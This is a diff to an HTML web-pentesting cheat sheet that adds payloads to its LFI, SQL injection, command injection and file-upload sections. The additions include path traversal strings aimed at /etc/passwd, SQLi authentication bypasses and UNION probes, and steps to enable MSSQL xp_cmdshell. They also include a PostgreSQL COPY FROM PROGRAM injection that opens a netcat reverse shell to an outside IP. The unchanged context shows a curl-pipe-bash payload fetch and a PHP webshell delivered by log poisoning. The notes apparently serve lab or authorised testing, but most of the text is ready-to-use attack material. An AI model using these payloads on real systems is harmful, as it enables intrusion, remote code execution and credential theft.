@@ -33,6 +33,8 @@
             <div class="notion-body">
                 <h2 id="Enumeration">Enumeration</h2>
                 <ul>
+                    <h3>Passive enumeration using external sources</h3>
+                    <a class="notion-link" href="https://searchdns.netcraft.com/">Netcraft</a>
                     <h3>Directory fuzzing</h3>
                     <pre><code class="language-bash">feroxbuster -u https://10.X.X.X/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --dont-filter -C 404 -f</code></pre>
                     <p>In case certificates annoy you</p>
@@ -94,7 +96,14 @@ gobuster vhost -u http://inlanefreight.htb:53137 -w /usr/share/seclists/Discover
                         </ul>
 
                         <h2 id="LFI: Local File Inclusion">LFI: Local File Inclusion</h2>
-                        <ul>
+                        <ul>   
+                            <h3>Check if LFI is present</h3>
+                            <ul>
+                                <p>In some website it may be possible that you dont find the typical http://IP/index.php?language=english.php</p>
+                                <p>In that case you should try a basic check so you can see if you can include local files or remote files</p>
+                                <pre><code class="language-url">http://IP/index.php?page=/etc/passwd</code></pre>     
+                            
+                            </ul>
                             <h3>Checklist once you found a file inclusion</h3>
                             <ul>
                                 <li>Check for files of the website you are pentesting. For example .php files which could lead you to credentials or configuration files </li>
@@ -119,6 +128,7 @@ gobuster vhost -u http://inlanefreight.htb:53137 -w /usr/share/seclists/Discover
                             <pre><code class="language-url">http://.../index.php?language=../../../../etc/passwd
 http://.../index.php?language=/../../../../etc/passwd
 http://.../index.php?language=....//....//....//....//etc/passwd
+http://public/plugins/mysql/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd # This is only for grafana but the double URL encoded chars can be reused in any path traversal attack
 http://.../index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
 http://.../index.php?language=./languages/../../../../etc/passwd
 http://...index.php?language=/etc/passwd%00.php</code></pre>
@@ -157,6 +167,7 @@ http://...index.php?language=/etc/passwd%00.php</code></pre>
                             <p> Basic payloads</p>
                             <pre><code class="language-sql">1 OR 1=1
 '+OR+1=1--
+' OR 1=1 -- // #Sometimes work commenting the rest of the query also with //
 ' OR 1=1; --
 ' OR '1'='1
 " OR "1"="1" --
@@ -175,11 +186,10 @@ http://...index.php?language=/etc/passwd%00.php</code></pre>
                     
                     <h3> Situationship example</h3>
                     <ul>
-                        <p>Supose you are in front of a website which allows you to search films based on specific string input. In that case if you issue "test" the website will perfomr</p>
+                        <p>Supose you are in front of a website which allows you to search films based on specific string input. In that case if you issue "test" the website will perform</p>
                         <pre><code class="language-sql">SELECT * FROM films WHERE name like '% $INPUT %'</code></pre>
                         <p>That way you can identify a filmname which ends with test and attempt the following injection</p>
-                        <pre><code class="language-sql">
-SELECT * FROM films WHERE name like '% test' --%'  # backend query
+                        <pre><code class="language-sql">SELECT * FROM films WHERE name like '% test' --%'  # backend query
 test'--</code></pre>   
                     </ul>
 
@@ -188,7 +198,8 @@ test'--</code></pre>
                     <ul>
                         <p>After everything remember that all this payloads have variants</p>
                         <b style="color: red;">Always start by 1 and go in crescendo</b>
-                        <pre><code class="language-sql">cn') UNION ...
+                        <pre><code class="language-sql">' ORDER BY 1 --  #Highly recommended to try at first. Go in crescendo and stop when the SQL prints an error 
+cn') UNION ...
 cn' UNION select 1,2,3,4 --
 cn' UNION select 1,2,3,4 -- -
 cn' UNION select 1,2,3,4 #</code></pre>
@@ -219,7 +230,8 @@ cn' UNION select 1,COLUMN_NAME,3,4 from INFORMATION_SCHEMA.COLUMNS where table_n
                             <pre><code class="language-sql">cn' UNION SELECT 1,username,3,4,5,6 FROM database_name.dbo.table_name --</code></pre>   
                             </div> 
                             <br>
-                            <div class="button" onclick="toggleDiv()">MySQL</div>
+                        <!--MYSQL -->     
+                        <div class="button" onclick="toggleDiv()">MySQL</div>
                             <div id="foldedDiv" class="content">
                             <p>Show all databases</p>
                             <pre><code class="language-sql">SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA; # Example
@@ -236,8 +248,31 @@ cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.C
                             <p>Show data</p>
                             <pre><code class="language-sql">cn' UNION select 1,username,password,4 from database.users --</code></pre>    
                             </div>
+                            <br>
+                            <!--PostGreSQL -->     
+                        
                                 
                         </ul>
+                    </ul>
+
+                    <h3>SQLi command injection</h3>
+                    <ul>
+                        <div class="button" onclick="toggleDiv()">MSSQL</div>
+                            <div id="foldedDiv" class="content">
+                                <p>Enabling xp_cmdshell</p>
+                                <pre><code class="language-sql">test';EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;--</code></pre>
+                                <p>Checking if the configuration was saved</p>
+                                <pre><code class="language-sql">test';IF EXISTS(SELECT * FROM sys.configurations WHERE name='xp_cmdshell' AND value_in_use=1) WAITFOR DELAY '0:0:5'--</code></pre>
+                                <p>Executing the query</p>
+                                <pre><code class="language-sql">EXEC xp_cmdshell 'powershell -c "..."'</code></pre>
+                            </div>
+                        <br>     
+                        <div class="button" onclick="toggleDiv()">PostGreSQL</div>
+                            <div id="foldedDiv" class="content">
+                                <p>Other injection queries can be found <a class="notion-link" href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.4-Testing_PostgreSQL">here</a></p>
+                                <p>Command Injection</p>
+                                <pre><code class="language-sql">'; DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(output text); COPY cmd_exec FROM PROGRAM '/usr/bin/nc.traditional -e /bin/bash 192.168.45.158 4444'; SELECT * FROM cmd_exec;--</code></pre>
+                            </div>
                     </ul>
 
                     <h3>Limiting results</h3>
@@ -371,6 +406,8 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\
                             
                             <h3>Situations</h3>
                             <ul>
+                            <h4>Wordpress admin creation via XSS</h4>
+                            <p>By performing a perfectly crafted request a user is able to abuse an XSS vulnerability in a wordpress plugin and trigger the creation of an administrator user. For more information check <a class="notion-link" href="wordpress.html">here</a></p>    
                             <h4>Adding parameter</h4>
                             <ul>
                             In case you find that parameters are passed through the URL you can try adding a new parameter and injecting the code there since it is not sanitized. 
@@ -468,6 +505,11 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\
                     <td><b>Only executes the second command if the first command fails (OR)</b> (ip a || ls) if ip a fails it will execute ls</th>
                 </tr>
                 <tr>
+                    <td>$(id)</th>
+                    <td>%24(id)</th>
+                    <td>Executes command inside the $(command) very useful when previous options didn't worked</th>
+                </tr>
+                <tr>
                     <td>{ls,-la}</th>
                     <td>%7Bls%2C-la%7D</th>
                     <td>The Bash Brace Expansion feature, which automatically adds spaces between arguments wrapped between braces</th>
@@ -535,6 +577,8 @@ $(rev<<<'imaohw')  #Reverting command</code></pre>
                 </ul>
                 
                 <h4>Windows</h4>
+                <p>First we can identify if the command injection performed in the web is using powershell or CMD. By using the following command and looking at the printed output</p>
+                <pre><code class="language-cmd">(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell</code></pre>
                 <ul>
                 <h5>CMD</h5>
                 <ul>
@@ -847,6 +891,7 @@ os.system("curl http://10.10.14.17:8000/shell.sh | bash")
 .pgif
 .phtml
 .phtm
+.pHP
 .php%00.gif
 .php\x00.gif
 .php%00.png
@@ -957,6 +1002,14 @@ file`whoami`.jpg</code></pre>
 
                                 <h4>Windows specific attacks</h4>
                                 <ul>
+                                    <h5>Situations</h5>
+                                    <ul>
+                                        <p>In case you found a server where there is a port 80 default IIS and a another port 8000 or any other which hosts a website that allows us to upload files we should try to upload a file in the 8000 port website and check whether the file can be access from the 80 website. Meaning</p>
+                                        <p>Website port 8000 allows file upload - Upload a malicious .aspx file </p>
+                                        <p>Website port 80 default IIS - Attempt to query the file by http://IP/malicious.aspx</p>
+                                    </ul>
+                                </ul>
+                                <ul>
                                     <p>One such attack is using reserved characters, such as <b>(|, <, >, *, or ?)</b>, which are usually reserved for special uses like wildcards</p>
                                     <p>Windows reserved names for the uploaded file name, like <b>(CON, COM1, LPT1, or NUL)</b>, which may also cause an error as the web application will not be allowed to write a file with this name.</p>
                                     <p>We can also use the <b>8.3 Filename Convention</b></p>
@@ -994,7 +1047,7 @@ file`whoami`.jpg</code></pre>
                                     <p>In case you are able to read any of them you'll figure out that the User-Agent is also stored there, which is a parameter that we can control</p>
                                     <p>So you'll need to intercept the request and introduce any php code &lt;?php system($_GET['cmd']) ?&gt;</p>
                                     <p>Then send the request </p>
-                                    <pre><code class="language-url">http://10.10.10.1:8080/index.php?language=/var/log/apache2/access.log?cmd=id</code></pre>
+                                    <pre><code class="language-url">http://10.10.10.1:8080/index.php?language=/var/log/apache2/access.log&cmd=id</code></pre>
                                 </ul>
 
                             </ul>
